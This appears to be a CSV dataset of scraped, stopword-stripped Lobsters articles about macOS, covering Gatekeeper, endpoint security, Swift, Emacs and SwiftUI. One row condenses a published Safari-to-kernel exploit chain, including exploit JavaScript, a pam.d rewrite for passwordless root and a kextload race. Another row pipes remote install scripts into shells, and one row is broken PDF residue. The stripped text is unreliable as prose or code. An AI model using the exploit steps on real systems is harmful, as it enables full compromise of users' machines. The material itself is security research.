ID,Source,Tag_Code,Tag_Name,Title,Url,ProcessdedTitle,WeightedContent,Content
1,Lobsters,mac,Apple macOS,Before the law sits a Gatekeeper,https://tombrow.com/before-the-law-gatekeeper,law sits gatekeeper,law ca nt right click btl cyjrc btl cyjrc btl,law franz kafka law sits gatekeeper gatekeeper come man country asks gain entry law gatekeeper say grant entry moment man think asks allowed come later possible say gatekeeper ca nt right click jeff johnson apple added gatekeeper mac o x macos try run mac software downloaded internet gatekeeper check whether software signed valid developer id certificate gatekeeper refuse run software people claim mac user right click run unsigned software mean exactly let look user experience series screenshots btl man country expected difficulty law always accessible everyone think look closely gatekeeper fur coat large pointed nose long thin black tartar beard decides would better wait get permission go inside cyjrc user would scared away rightfully apple specifically deliberately warning malware exposing right mind would ignore warning nt already know safe ignore btl sits day year man equipped many thing journey spends everything matter valuable win gatekeeper latter take say taking think failed anything cyjrc every mac developer know sign developer id ship signed notarized apps would financial suicide otherwise business perspective avoiding gatekeeper however mac apple silicon run adhoc signed software nt require certificate according man page codesign commandline tool adhoc signing use identity identifies exactly one instance code significant restriction apply use adhoc signed code consult documentation using btl everyone strives law say man many year one except requested entry gatekeeper see man already dying order reach diminishing sense hearing shout one else gain entry since entrance assigned going close
2,Lobsters,mac,Apple macOS,Can't you just right click?,https://lapcatsoftware.com/articles/unsigned.html,ca nt right click,ca nt right click addendum august michael tsai addendum august hacker news,ca nt right click apple added gatekeeper mac o x macos try run mac software downloaded internet gatekeeper check whether software signed valid developer id certificate gatekeeper refuse run software year gatekeeper become strict recently adding notarization requirement macos catalina gatekeeper check whether software signed valid developer id certificate also phone home check whether apple notarized software refusing run check fails mac developer must sign apple developer program sign legal agreement pay annual fee usd plus tax order obtain developer id code signing certificate upload software apple notarization distribute mac software internet without signing thereby avoiding developer id notarization entirely technically currently yes although apple indicated future version macos may allow unsigned code run people claim mac user right click run unsigned software mean exactly let look user experience series screenshots illustration created unsigned application mygreatapp uploaded server downloaded app safari macos latest public version mac operating system experience essentially beta version macos big sur except new io style alert look even worse see try open app normally double click finder alert mention possibility malware default action move trash good start notice mention right clicking user happens notice click question mark button smallest user interface element window help window open help document helpfully mention malware title mention right clicking last sentence document link another document open app overriding security setting finally see instruction right click err control click control click app finder see contextual menu select open contextual menu another warning scary message mentioning malware loss privacy move trash default option click open button though work advertised right click run unsigned mac software pro mac user already know expect procedure difficult mac user never seen odds make end near zero user would scared away rightfully apple specifically deliberately warning malware exposing right mind would ignore warning nt already know safe ignore mac developer nearly impossible run viable software business firstrun experience new customer never get new customer every mac developer know sign developer id ship signed notarized apps would financial suicide otherwise technically option right click practically viable distribution option mac developer business perspective avoiding gatekeeper addendum august thanks michael tsai pointing new mac apple silicon stricter requirement software signing still run unsigned software compiled intel processor run unsigned software compiled apple silicon processor however run adhoc signed software nt require certificate according man page codesign commandline tool identity single letter dash adhoc signing performed adhoc signing use identity identifies exactly one instance code significant restriction apply use adhoc signed code consult documentation using adhoc sign app xcode nt test adhoc signing nt realize would difference adhoc signing specifically designed running software locally word mac someone else mac far know intended software distribution gatekeeper alert adhoc signed app actually bit pleasant albeit confusing notice longer move trash button progress however alert claim software need updated inaccurate open contextual menu select open see alert able open app although process still quite confusing novice given choice distributing unsigned app adhoc signed app probably ship adhoc signed app alert seem little le scary nonetheless either case likely lose new potential customer first step also noted tested adhoc signing intel mac running catalina nt apple silicon developer transition kit testing addendum august read useful comment hacker news nt see mentioned article get every time rightclick trick work second time try launch app first time rightclick macos wo nt let launch app testing catalina comment correct first right click app display first alert screenshots open button second right click display second alert screenshots open button also note holding option key contextual menu make difference although seem recall made difference earlier version macos
3,Lobsters,mac,Apple macOS,"The XCSSET Malware: Inserts Malicious Code Into Xcode Projects, Performs UXSS Backdoor Planting in Safari, and Leverages Two Zero-day Exploits",https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf,xcsset malware insert malicious code xcode project performs uxss backdoor planting safari leverage two zeroday exploit,,obj metadata rviewerpreferences r endobj obj endobj obj extgstate font procset pdftextimagebimagecimagei mediabox content rgroup tabssstructparents endobj obj stream
4,Lobsters,mac,Apple macOS,Sinter: New user-mode security enforcement for macOS,https://blog.trailofbits.com/2020/08/12/sinter-new-user-mode-security-enforcement-for-macos/,sinter new usermode security enforcement macos,simple opensource swift sinter endpointsecurity api installer beta version example rule kind event quest usermode security agent macos big sur endpointsecurity api endpointsecurity kauth kpi openbsm audit quickly event monitoring process monitor google santa promise better memory safety performance objectivec developing sinter faint heart making decision realtime without impacting system mitigating toctou risk realtime security decision toctou issue raised toctou santa openradar macos executable file live application bundle attempt bundle file integrity monitoring capability advantage installing agent system extension system extension driverkit network extension system integrity protection mastering entitlement signing notarization workflow special entitlement cmakedriven approach ci stay tuned upshot get involved sinter available today contact u get started github empire hacking slack like,tl dr sinter first available opensource endpoint protection agent written entirely swift support apple new endpointsecurity api first principle sinter demonstrates build successful eventauthorization security agent incorporates solution many challenge endpoint protection agent face migrate kernelmode usermode agent release macos big sur simple opensource swift sinter new opensource endpoint security enforcement agent macos written swift built scratch usermode agent leveraging new endpointsecurity api receive authorization callback macos kernel set securityrelevant event type sinter controlled simple rule allow deny us none expensive fullsystem scan signaturebased detection traditional antivirus solution grab installer beta version today try currently sinter let write set rule block allow process execution event provide rule agent santacompatible sync server local configuration file example rule demonstrates explicitallow however planning develop sophisticated rule syntax add blocking capability many kind event supported api would also mean end santa rule compatibility quest usermode security agent implementing endpoint security solution eg antivirus antimalware requires interception authorization oslevel event real time historically meant use kernelmode callback apis hooking kernelmode operating system code proper api provided operating system developer long known thirdparty kernelmode code like leading source system instability insecurity small error kernel code tends large consequence enter macos endpointsecurity api late apple announced support thirdparty kernel extension would deprecated macos would introduce usermode apis framework replace functionality needed thirdparty product security vendor put notice deprecate existing kernelmode solution within next year migrate endpointsecurity api next release macos macos big sur clearly fun prospect many team soon announcement client tapped u develop usermode solution would make migration le painful endpointsecurity api endpointsecurity api implement callback macos kernel real time particular event happen endpointsecurity client subscribe one event type either notify type auth authorization type notify sound like useful capturing simple activity log host authorization callback much powerful let client process make decision allow deny event happening endpointsecurity replaces kernelmode equivalent realtime event authorizing macos kauth kpi unsupported kernel method readonly event monitoring openbsm audit trail realtime monitoring protection product macos must rewritten use endpointsecurity macos big sur note networkrelated event endpointsecurity api except unix domain socket network extension framework combine use apis one system extension focus endpointsecurity api specifically using api stephen davis fireeye patrick wardle objectivesee quickly released event monitoring application could display example processrelated filerelated event real time readonly monitoring tool following footstep process monitor procmon useful using notify half functionality endpointsecurity api ability monitor google santa opensource macos process allowdeny solution objectivec demonstrates ability authorize event using endpointsecurity agent receives make allowdeny decision process event endpointsecurity saw would critically important master endpointsecurity api many team would need migrate existing macos security application development sinter delved endpointsecurity learned lesson experience incorporated solution various challenge sinter also demonstrates implementation endpointsecurity client swift programming language promise better memory safety performance objectivec maintaining compatibility new macos apis developing sinter faint heart implementing eventauthorizing agent order magnitude difficult implementing readonly eventsubscriber also hard shortcoming endpointsecurity api significant heavy lifting course sinter development making decision realtime without impacting system possibly difficult part implementing security event authorization agent authorization decision must made real time block forever make decision endpointsecurity enforces deadline authorization message client blow deadline endpointsecurity terminate client process preserve functioning system decision made synchronously sinter us escopymessage dequeue message endpointsecurity allow dispatcher immediately send next message decision made separate thread responding asynchronously soon possible one decision take longer others process often apis needed perform signature check interrupted sinter ran problem headon quick burst execution event involving large program caused sinter lock machine solved implementing efficient queuing system one queue small program another one big program event would never get stuck waiting queue bigprograms queue work outofprocess longrunning verification aborted whenever necessary new approach performs reliably test mitigating toctou risk realtime security decision toctou time check time use race condition vulnerability pattern commonly occurs making security decision security agent performing check must allow checked resource modified time check action approval authorizing macos execution event resource checked executable file mapped memory executing one toctou attack scenario malicious actor executes badapp bad executables mapped memory execution authorization event emitted endpointsecurity attacker immediately replaces modifies executable file make goodapp endpointsecurity client get event verifies bundle file look good allows execution problem unique endpointsecurity always risk kauth framework preceded eg issue raised toctou santa long ago still challenge must solved agent want authorize event mentioned sinter attempt monitor file event catch toctou attack would much easier apple handled responsibility within endpointsecurity api submitted apple developer feedback suggestion see openradar macos executable file live application bundle execution event occur context single executable file macos executables exist within application bundle directorylike structure appears single app file macos finder bundle codesigned codesigning verification must done bundle level mean security agent catch execution event must discover executable containing app bundle verify code signature entire task performed endpointsecurity bundle like apple xcodeapp upwards gigabyte size processing verification real time possible execution event denied first verification completes endpointsecurity provide builtin caching mechanism single cache shared endpointsecurity client however client invalidate single entry cache clear entire cache endpointsecurity automatically invalidate cache item related file changeddeletedetc perfile basis perapplicationbundle currently sinter work two cache one managed endpointsecurity another custom cache containing application bundle codesigning verification result theory malware could added application bundle endpointsecurity would react clearing cached approval decision previously approved executable file bundle changed endpointsecurity client would monitor invalidate entire cache response le ideal hope apple make improvement caching mechanism near term endpointsecurity client may implement integrity monitoring application bundle avoid circumvented way sinter attempt bundle file integrity monitoring capability detect custom cache cleared advantage installing agent system extension system extension apple name usermode component extend system umbrella term replaces nowdeprecated thirdparty kernel extension endpointsecurity one api umbrella driverkit network extension couple others system extension also new kind managed plugin package macos install executable installing endpointsecurity client system extension implement endpointsecurity functionality kind executable even basic commandline highly encouraged additional benefit systemenforced protection agent installed system extension system extension opt loaded thirdparty application startup apple also announced macos extends sip system integrity protection cover system extension meaning prevents even root user unloading security agent historically possible developed kernelmode antitamper logic installing agent system extension free reinventing wheel sinter currently background daemon apple documented antitamper protection benefit installing agent system extension converting sinter format mastering entitlement signing notarization workflow endpointsecurity api usable within codesigned notarized application appleapproved developer like trail bit word api gated special entitlement unlike entitlement one requires manual application approval apple granted codesigning certificate endpointsecurity entitlement case time approved six calendar week mileage may vary apple apparently careful entitlement misbehaving malicious endpointsecurity client could put halt everything host system apple codesigning notarization step difficult troubleshoot fail essential set automate process early immediately notice break easily narrow breaking change sinter created cmakedriven approach automates workflow apple notarization packaging package signing package notarization step integrates perfectly ci minimal fuss one last entitlement endpointsecurity agent need related user privacy agent inspecting file whether context file event executables process event need user permission access filesystem first run application user must manually go privacy setting system preference enable full disk access mdm payload automatically enable permission sidestep manual user approval step thornier challenge addressed writing sinter course miscellaneous gotchas lesson learned eg determining whether file binary signature verification multiple endpointsecurity client update compelling detail development tuned upshot deprecation kernel extension apple leveling playing field endpoint protection agent everyone must use usermode apis benefit everyone improved system stability reduced attack surface existing security product developer first replace kernel extension usermode approach user mode work language cc instead starting scratch example code c hope organization help u build rely upon opensource platform swift forwardlooking choice longterm investment apple successor objectivec get involved sinter beta version sinter available today significant first step peek larger item working invite partner u sponsor continued development sinter discus integration endpointsecuritybased capability existing contact u get started contributor welcome give u feedback github join u sinter channel empire hacking slack like like loading
5,Lobsters,mac,Apple macOS,"Porting Redux Architecture to Swift (Well, for a Toy macOS App Anyway)",https://medium.com/insertgif/porting-redux-architecture-to-swift-well-for-a-toy-macos-app-anyway-ed61bad0395c,porting redux architecture swift well toy macos app anyway,porting redux architecture swift well toy macos app anyway insertgif store action testable debuggable easy understand easy reason store action store action app easily mutate store store action swift insertgif grand central dispatch grand central dispatch subscription higherorder reducer insertgif spectacle insertgif twitter producthunt originate,porting redux architecture swift well toy macos app anyway boy medium back day let sit rocking chair install modperl movabletype put something internet uppercased internet back liked walked told get back talking software architecture insertgifsoftware architecture exciting topic nobody else ever pontificated one nicer experience programming last year writing react component using redux unfamiliar web development talking much react redux little tutorial help know store action goal architect toy app testable debuggable easy understand easy reason idea separating store set action whatever word may mean declarative userinterface description html jsx cocoa view view controller rooted older idea separating data presentation one another behind cascading style sheet microsoft powerpoint different app microsoft word last one real making sure still paying attention scan header image blog post people critical reading skill way get pandemicstores actionswe define store location canonical representation data true know true current point time great definition try hard definition specific tell lielet say writing gui component show bank account part new bank account app store app would containall transaction renderedthe computed account balance iterate list transaction time instead n ya knowthe user avatar scroll page scrolled cover valuable information client wanted thought would spiffy app littlein kingdom javascript would represent store giant usually immutable object array string float object would want exact decimal banking app would look javascript work would sigh resign float action concrete object encode event relevant store either creating new version store requiring information store definition meant wideencompassing generic constitutes action really depends business logic patience write kinda boilerplatey code store action macos app might button clicka menu item clickthe user resized application windowa keypress happeneda keypress another app happenedan thread monitoring http request completed another threadmacos restartthe computer firebut promise something want mutate store must take place action first user want withdraw money bank balance app must first encode action action type withdrawal amount description buy new airpod old one fell chewing user uploads new avatar must make action type avataruploaded buffer containing jpeg data good implementation architecture macos application make difficult view view controller violate promise say app easily mutate store application scale include component data dependency becomes harder reason one nice aspect storeandactions architecture cheerfully named redux architecture get click link make change store explicit first change must encoded action function might call reducer must patternmatch stream action create new storestore action swiftif programmed io macos might degree recognize store another name core data managed object context le analogous store instead represented object graph encoding n n relationship giving u way project insert update delete node graph true would want unless good reason use core data application especially looking build team developer scale something approaching fancy macos app cost app storehowever let say want build toy app quickly something fun hacked together weekend yet still completely suck managing data perhaps encode store immutable object using swift struct integer also great way store decimal huh want design withdrawal first action might look like represent action using swift enum need fold stream action creating new version store along way redux represents part codebase take action produce new version immutable store reducer borrow terminology even though diction esoteric need let assume writing multiple reducer time like structure new feature ticket insertgif new reducer use protocol unify type level protocol would call interface language term come objectivec objectivec different objectivec like differentnote using swift value type structs first copy store nextstore update field new store returning common reducer code go ahead give helper make easier reason need inout keyword mutate new cloned store swift better immutable record update syntax would probably herethis banking code trustgrand central dispatch grand central dispatch write layer architecture construct store run reducer central location action dispatched handled imaginatively call dispatch view controller hook nsbutton dispatch every time user click withdraw button withdrawal action occurs real banking app would probably also want enter routing account number place withdrawing fun show blithely ignore aspect realworld bankingsome kinda cool immediate benefit get store action even extremely unrealistic example app business logic life reducer eminently testable need construct cocoa view run unit test reducer need mock storea great way debug app print action dispatch place xcode breakpoint possible external stimulus outside world pas time something unexpected happens able trace exact action caused ita common request product manager boss alike implement user analytics user click button user coming funnel user giving u information andor money write track reducer convert user behavior google analytics segment event making remote call event come fire forget minute form event sourcing friend sönke point outas app grows becoming unruly moody want refactor feature adage write code easy delete believe reducer written way satisfies rule thumb drop action reducer use compiler list compiler error find usesites imagine written view controller directly read modified array transaction balance would audit location user action led mutation would also pull business logic entangled view codesubscriptionswith withdrawal feature place would like render screen app contains list transaction account balance user avatar javascript react component update automatically dependency store among change benefit componentized user interface cocoa still benefit thinking oneway dataflow store presentation data storedispatch already single place action flow take advantage architectural watering hole use invoke subscription first let u model subscription callable object c would call functor object hear saying computer remind c escaping keyword mark closure later use constrains kind closure passed parameter help prevent reference cycle life escaping cycle construct ourselvesas subscription come store array action occurs iterate array invoke subscription small wrinkle memoize projection store avoid unnecessary ui updatesthis work breaking subscription two map action like mapstatetoprops redux encourage view controller construct equatable object containing subset information store projection need action need fire time action occursin general strike central weakness storeandactions architecture difficult write performant app certain highfrequency action encoded object passed every reducer however toy app suffices fine also imagine app certain part app flee normal architecture manage state squeeze extra framesit remains implement subscriber generic variable exists know kind type view controller want represent state know need equatable implement inequality checknow use subscription reactively update cocoa view oh boy view controller easy writethis completes core loop architecture change happens user click withdraw one view controllerthe change packaged actiona reducer several handle action creates new storesubscribers invoked new storea second view controller subscribed store update viewsone last thing though multiple reducer higherorder reducersthis title book programming would sell bunch copy even though nobody would able understand alternate universe paid content make internet suppose universe need reducer multiplex action many reducer despite fancy title simple write could keep going bank app think would neat show actual list reducer look like insertgif give hint feature ticket wanted implement release app action shoutout opensource spectacle app wayeven toy app already kind complicated might posit writing user interface essentially hobby worry tiny detailsthat allgo check insertgif already also twitter producthunt keep updating long remember insertgif made love nyc proud alumnus originate r laboratory hope much fun reading individually creating gist medium sevenyear old product support syntax highlighting code block
6,Lobsters,mac,Apple macOS,A Nix overlay for Emacs 27 with the 'emacs-mac' patches,https://cmacr.ae/post/2020-08-12-a-nix-overlay-for-emacs-27-mac/,nix overlay emacs emacsmac patch,updated release emacs nix overlay emacsmac,update official emacsmacport package updated nixpkgs master branch hit nixpkgsunstable channel soon recent release emacs figured share nix overlay using build emacsmac patch emacs come great performance improvement including native json support make really slick experience lspmode top really nice mitsuharu yamamoto patch enhance experience macos thing play lot nicer emacs superemacsmacportoverrideattrs rec version macportversion emacsname emacs version src builtinsfetchurl url http mirrorkoddosnetgnuemacs emacsname tarxz macportsrc builtinsfetchurl url ftp ftpmathschibauacjpemacs emacsname mac macportversion targz patch docheck false installtargets tag install buildinputs obuildinputs superjansson configureflags oconfigureflags withjson moment test nt passing need pas docheck false nt experienced issue yet
7,Lobsters,mac,Apple macOS,The Promise vs Reality of SwiftUI Multiplatform,https://write.as/angelo/the-promise-vs-reality-of-swiftui-multiplatform,promise v reality swiftui multiplatform,last week post tweeted letdown swiftui illustrated broken button reality multiplatform via r,happy august friend update last week post swiftui app writefreely work progressed pretty well shared code last week point got preliminary ui display list post filter collection tapping post load editor make change title content iphone ipad also new post button create new draft iphone ipad well pull chair let chat little bit gap promise reality multiplatform swiftui apps working post tweeted managed flesh key ui feature app across iphone ipad mac day thanks swiftui live preview xcode show view look like next code update realtime code stated building native app speed iteration ever encountered building web looking html cs looking react latest iteration look like far iphone ipad installed macos aka big sur beta able build mac app compare way final ui plenty work still done including replacing unusual picker view selecting collection proper sidebar adapting spacing little better mac app ca nt preview anything mac target even xcode upgrade machine macos beta one thing helpful moving quickly swiftui declarative nature let specify semantics element placement view letting framework figure mean iphone v ipad v mac great example focus developer experience dx toolbaritemplacement api let semantically state particular item add toolbar primaryaction status element used texteditor view place post status badge status area publish button primaryaction area see screenshots shared element placed differently depending whether shown iphone ipad mac nt write single line code customize difference letdown swiftui illustrated broken button life swiftui rose newdraft feature nt quite working fully yet building iphone ipad version app tapping newdraft button list post work beautifully slide new draft list open text editor next great essay thrilled working end workday friday finished installing big sur beta mac morning excited see everything looked worked mac app expected little ui refinement list post example need healthy dose padding otherwise figured similar experience least ipad app mostly picker replaced popup menu choose collection narrow list post tap post list load text editor ready change post status change instantly update badge toolbar post list tried create new draft mac clicking newdraft button appears interestingly enough next poststatus badge screenshot nothing thing error thrown view drawn nothing reality multiplatform suppose nt use word letdown multiplatform panacea reality app expects different thing iphone ipad mac issue facing newdraft button nt failing swiftui paradigm mac app treat navigation v button v instantiating new window different iphone nt structured thing way framework expects fine need spend little time adapting mac client would liked got say despite couple little issue need fix really impressed much worked right box extra work part nativeapp development may yet happen pace web development closer ever enter email subscribe update also subscribe via r follow angelo writeas mastodon
8,Lobsters,mac,Apple macOS,Compromising the macOS Kernel through Safari by Chaining Six Vulnerabilities,https://github.com/sslab-gatech/pwn2own2020,compromising macos kernel safari chaining six vulnerability,compromising macos kernel safari chaining six vulnerability overview winning submission targeting apple safari kernel escalation privilege macos blackhat usa slide demo video reproduce build source technical detail remote code execution safari via incorrect sideeffect modeling operator javascriptcore dfg compiler yong wang blackhat eu talk arbitrary app launching safari via symbolic link didfailprovisionalload arbitrary code execution cvm core virtual machine service via heap overflow macos firsttime app protection bypass root privilege escalation cfprefsd via arbitrary file folder permission modification caused race condition kernel privilege escalation using module staging bypass race condition kextload author citation reference,compromising macos kernel safari chaining six vulnerability overview repository contains exploitation technical detail winning submission targeting apple safari kernel escalation privilege macos information also check blackhat usa slide repository also includes demo video succesful exploitation reproduce run http server using exploit folder httpserver access website attacker server ip safari http attackerip exploithtml wait calculator usually popped ten second unlucky take time terminal kernel privilege show kernel privilege escalation disabled sip check running csrutil status command show disabled build source convenience provided compiled payload payloadjs want build note take long time build webkit part exploit chain worth noting tested building process mac o install xcode first pip install user lief make technical detail make exploit chained following six vulnerability remote code execution safari via incorrect sideeffect modeling operator javascriptcore dfg compiler javascriptcore indexed property queried operator dfg compiler assumes sideeffect free unless proxy object prototype chain intercept operation javascriptcore mark object intercept indexed property access using flag called mayhaveindexedaccessors flag explicitly marked proxy object sideeffect free let arr arrproto new proxy arr cause sideeffect however another object cause sideeffect jshtmlembedelement implement getownpropertyslot method one way trigger javascript callback ie side effect operator using embed element pdf plugin property queried embed object tag dom object try load backed plugin domsubtreemodified event handler called pdf plugin case us appendchild method body element stack trace calling sideeffect getownpropertyslot stack trace webkit pdfplugin pdfplugin webkit webframe webkitwebkitbuildreleasewebkitframeworkversionsawebkit webkit pdfplugin create webkit webframe webkitwebkitbuildreleasewebkitframeworkversionsawebkit webkit webpage createplugin webkit webframe webcore htmlpluginelement webkit plugin parameter const wtf string webkitwebkitbuildreleasewebkitframeworkversionsawebkit webkit webframeloaderclient createplugin webcore intsize const webcore htmlpluginelement wtf url const wtf vector wtf string wtf crashonoverflow wtf fastmalloc const wtf vector wtf string wtf crashonoverflow wtf fastmalloc const wtf string const bool webkitwebkitbuildreleasewebkitframeworkversionsawebkit webcore subframeloader loadplugin webcore htmlpluginimageelement wtf url const wtf string const wtf vector wtf string wtf crashonoverflow wtf fastmalloc const wtf vector wtf string wtf crashonoverflow wtf fastmalloc const bool webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore subframeloader requestobject webcore htmlpluginimageelement wtf string const wtf atomstring const wtf string const wtf vector wtf string wtf crashonoverflow wtf fastmalloc const wtf vector wtf string wtf crashonoverflow wtf fastmalloc const webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore htmlpluginimageelement requestobject wtf string const wtf string const wtf vector wtf string wtf crashonoverflow wtf fastmalloc const wtf vector wtf string wtf crashonoverflow wtf fastmalloc const webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore htmlembedelement updatewidget webcore createplugins webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore frameview updateembeddedobject webcore renderembeddedobject webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore frameview updateembeddedobjects webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore frameview updateembeddedobjectstimerfired webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore document updatelayoutignorependingstylesheets webcore document runpostlayouttasks webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore htmlpluginelement renderwidgetloadingplugin const webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore htmlembedelement renderwidgetloadingplugin const webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore htmlpluginelement pluginwidget webcore htmlpluginelement pluginloadingpolicy const webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore pluginscriptobjectfrompluginviewbase webcore htmlpluginelement jsc jsglobalobject webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore pluginscriptobject jsc jsglobalobject webcore jshtmlelement webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore pluginelementcustomgetownpropertyslot webcore jshtmlelement jsc jsglobalobject jsc propertyname jsc propertyslot webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore jshtmlembedelement getownpropertyslot jsc jsobject jsc jsglobalobject jsc propertyname jsc propertyslot webkitwebkitbuildreleasewebcoreframeworkversionsawebcore llintslowpathgetbyid webkitwebkitbuildreleasejavascriptcoreframeworkversionsajavascriptcore since object prototype chain marked mayhaveindexedaccessors jit assumes use operator nt transition inside eliminating array type check transition frame iframe src pdf iframe function opt arr arr arr exists arr making check proto return arr var opt arrproto documentqueryselector embed documentbodyaddeventlistener domsubtreemodified arr documentbodyremovechild embed opt leak address double value constructing addroffakeobj primitive could make arbitrary rw primitive get code execution jitcompiled javascript function getting addroffakeobj primitive convert stable addroffakeobj primitive faking object hostobj hostobjstructureid hostobjbutterfly dummy length new asdouble fakehostobj fakeobj addressof hostobj id new asjsvalue butterfly null executable padding offset unlinkedexecutable isbuiltinfunction padding offset identifier null fakeidentifier fakeobj addressof hostobj strlenorid new asdouble stringsize target hostobj stringdataptr hostobjexecutableunlinkedexecutableidentifier fakeidentifier functionprototypetostring fakehostobj function leakedstructureid native code leak structure id hostobj making fake function object fakehostobj calling functionprototypetostring name function reflects structure id value string update hostobj leaking structure id worth noting technique yong wang blackhat eu talk hostobj hostobjstructureid hostobjbutterfly dummy length new asdouble fakehostobj fakeobj addressof hostobj id leakstructureidasdouble fakehostobjstructureid butterfly fakehostobj fakehostobjbutterfly fakehostobj butterfly pointing fakehostobj use addroffakeobj primitive without triggering bug since access hostobjo jsvalue double using fakehostobj using leaked structure id attackobj addroffakeobj primitive craft object like rwobj rwobjstructureid rwobjbutterfly dummy length new asdouble fakerwobj fakeobj addressof rwobj id leakstructureidasdouble fakerwobjstructureid butterfly fakerwobj fakerwobjbutterfly dummy innerlength new asdouble fakeinnerobj fakeobj addressof rwobj innerid leakstructureidasdouble fakeinnerobjstructureid innerbutterfly fakeinnerobj fakeinnerobjbutterfly get arbitrary rw primitive using fakerwobj update fakeinnerobj butterfly pointer readwrite fromto fakeinnerobj get rce arbitrary rw primitive trigger jit compilation dummy function leak code address overwrite shellcode sometimes code address leak fails ca nt readwrite certain value fake array case try approximate reading pointer location shifting read value finally overwrite code pointer alert function dummy function code pointer call argument execute shellcode arbitrary app launching safari via symbolic link didfailprovisionalload file url safari open finder window nsworkspace selectfile infileviewerrootedatpath function accepts two parameter case safari us first parameter show containing folder specified file second parameter used instead finder launch file executable app bundle safari us second parameter confirming pointed path application bundle directory app suffix since symbolic link point application bundle directory app suffix thus safari launch application pointed symbolic link code path triggered sending didfailprovisionalload ipc message however safari create symbolic link due system call filter seatbelt sandbox use another vulnerability give root sandboxed code execution arbitrary code execution cvm core virtual machine service via heap overflow sandboxed xpc service named comapplecvmsserv ie cvmserver compiles shader various architecture part builtin opengl framework request message field set cvmserver par userspecified framework data map map data file located systemlibrarycachescomapplecvms umaps first userspecified without filter directory traversal possible make parse file created within safari sandbox file fp fopen frameworkname r header header malloc fread header itemsoffset header itemsoffset itemscount header itemscount header realloc header itemscount itemsoffset fread header itemsoffset itemscount itemcount itemsoffset fread receive underflowed length near becomes heap overflow arbitrary length payload note fread stop end specified file reached utilizing could overwrite heap object related connection could modify pointer mentioned case message input heapindex cvmsserverservicegetmemory session port size goto error xpcdictionarysetmachsend reply vmport port fastcall cvmsserverservicegetmemory xpcsession unsigned index dword port qword pool pool rax unsigned int ebx heapitem rax pthreadmutexlock serverglobals attachedservice controlled value pool attachedservice context poolptr pool pointerscount index pool pointer port index port index size pthreadmutexunlock serverglobals return port value taskself service grant client send right cvmserver task port used allocate memory execute arbitrary code process make index port searched memory library area address across process rax userinput x length machtaskself many area two integer value found xpcerrorterminationimminent public symbol satisfies condition since length larger could calculate modular inverse point since cvmserver comapplesecuritycsallowjit set could call mmap mapjit flag invoke reflective loader execute dylib file process ran code cvmserver vardbcvms writable folder char randbuf sprintf randbuf luapp clock symlink randbuf myapp create valid application myapp creating luapp symbolic link myapp returned safari sent ipc message open app two protection quarantine check openingtheappforthefirsttime check macos firsttime app protection bypass safari try execute app first time safari denies execution file attribute called comapplequarantine wait user confirmation file created webprocess attribute comapplequarantine however already bypass created folder cvmserver process webprocess user confirmation macos first creates process suspends continue process user click open button sending sigcont signal worked clicking button thus ran code continuously cvmserver creating myapp int kill sigcont root privilege escalation cfprefsd via arbitrary file folder permission modification caused race condition cfprefsd another xpc service allows user create plist file located corefoundation recheable unsandboxed process since already got unsandboxed privilege normal user ie cvmserver request create plist file target folder file sufficient permission bit allows client user write file however folder exist creates folder plist file recursively code snippet cvmserver creates folder cfprefscreatepreferencesdirectory path slice pathsplit cur slice mkdir cur errno eexist eisdir chmod cur perm chown cur clientid clientgroup else break path point userwritable directory user replace directory pointed cur replace symbolic link arbitrary filefolder since cfprefsd root privilege possible change owner folder like etcpamd changing owner etcpamd write etcpamdlogin content auth optional pampermitso auth optional pampermitso auth optional pampermitso auth required pampermitso account required pampermitso account required pampermitso password required pampermitso session required pampermitso session required pampermitso session optional pampermitso login root command give user root shell without authentication kernel privilege escalation using module staging bypass race condition kextload kextload one program perform kext kernel extension operation macos running kextload path kext folder root user load signed kext user mode prevent unsigned invalid signed kexts kextload set authenticator callback iokituser package unfortunately path kext available resource callback race condition hard prevent mitigate kextload first copy kext folder dedicated space librarystagedextensions modified even root privilege thanks sip entitlement mechanism kextload work follows execute kextload tmpakext kextload copy original kext folder librarystagedextensionstmp uuid kext kextload check sign file folder fails deletes folder otherwise copy folder librarystagedextensionstmpakext load module kextload tmpakext copy librarystagedextensionstmp uuid kext validate signature failed delete directory succeeded copy librarystagedextensionstmpakext load kext one issue kextload process terminated root privilege user worth noting aforementioned copy includes symbolic link validated later however kill kextload process validation preserve invalid kext symbolic link librarystagedextensions assume tmpakextsymlink tmp kextload tmpakext copy librarystagedextensionstmp uuid kext kill process librarystagedextensionstmp uuid kextsymlink remained execute another kextload command kextload tmp uuid kextsymlinkbkext bkext copied writable location root privilege user eg tmp uuid kext kextload tmp uuid kextsymlinkbkext copy librarystagedextensionstmp uuid kextsymlink uuid kext since symlink tmp equal tmp uuid kext copying kextload check located secure location librarystagedextensions temporarily place symbolic link tmpakext point librarystagedextensions path valid kext validation replace module binary unsigned kernel module get kernel code execution make race reliable used sandboxexec stop program file access specified suffix author citation inproceedings jin title compromising macos kernel safari chaining six vulnerability author yonghwi jin jungwon lim insu yun taesoo kim booktitle black hat usa briefing black hat usa month aug year address la vega nv reference
9,Lobsters,mac,Apple macOS,Apple Silicon Developer Transition Kit,https://www.driftingruby.com/episodes/apple-silicon-developer-transition-kit,apple silicon developer transition kit,,install homebrew sudo xcodebuild license cd mktemp git clone http githubcomrubyfiddle cd fiddle bundle install path vendorbundle bundle exec rake build sudo gem install binbash c curl fssl http rawgithubusercontentcomhomebrewinstallmasterinstallsh install ohmyzsh curl l http rawgithubcomrobbyrussellohmyzshmastertoolsinstallsh sh zsh chmod r usrlocalsharezsh install asdf ruby brew install coreutils curl git brew install asdf echo brew prefix asdf asdfsh zshrc asdf pluginadd ruby http githubcomasdfvmasdfrubygit asdf install ruby
